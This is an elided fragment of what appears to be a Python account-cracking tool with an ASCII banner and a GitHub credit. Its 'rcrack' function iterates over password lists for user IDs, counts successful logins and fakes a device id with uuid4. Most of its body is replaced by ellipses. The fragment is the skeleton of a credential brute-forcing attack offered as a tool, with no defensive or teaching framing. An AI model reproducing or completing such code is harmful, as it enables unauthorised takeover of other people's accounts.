...
.d8888. d88888b .88b  d88. db    db 
88'  YP 88'     88'YbdP`88 `8b  d8' 
`8bo.   88ooooo 88  88  88  `8bd8'  
  `Y8b. 88~~~~~ 88  88  88  .dPYb.  
db   8D 88.     88  88  88 .8P  Y8. 
`8888Y' Y88888P YP  YP  YP YP    YP 
...
------------------------------------------
 ...
 GitHub  : https://github.com/EKAB172
------------------------------------------"""
...
def rcrack(ids,pwx):
    ...
    try:
        for pas in pwx:
            sys.stdout.write('\r\33[1;37m[EKAB-XD] %s|OK:%s  \r'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
